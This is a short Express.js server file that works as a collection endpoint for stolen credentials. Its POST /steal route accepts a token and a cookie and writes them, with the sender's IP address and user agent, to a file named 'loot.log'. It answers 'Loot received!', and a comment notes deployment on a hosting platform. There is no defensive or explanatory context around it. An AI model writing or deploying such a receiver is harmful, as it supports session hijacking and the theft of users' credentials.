// server.js
const express = require('express');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

const app = express();

// Parse JSON bodies
app.use(express.json());

// --- Logging Configuration ---
const LOG_FILE = path.join(__dirname, 'loot.log');
const logStream = fs.createWriteStream(LOG_FILE, { flags: 'a' });

function logSecure(data) {
    const entry = {
        timestamp: new Date().toISOString(),
        ...data
    };
    const line = JSON.stringify(entry) + '\n';
    logStream.write(line);
}

// --- Routes ---
app.post('/steal', (req, res) => {
    const { token, cookie } = req.body;

    if (!token && !cookie) {
        return res.status(400).json({ error: 'Missing token or cookie' });
    }

    logSecure({
        action: 'steal',
        token: token,
        cookie: cookie,
        ip: req.ip,
        userAgent: req.get('User-Agent')
    });

    res.status(200).json({ message: 'Loot received!' });
});

// Start HTTP server
// Render expects the app to listen on process.env.PORT
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});

module.exports = app;
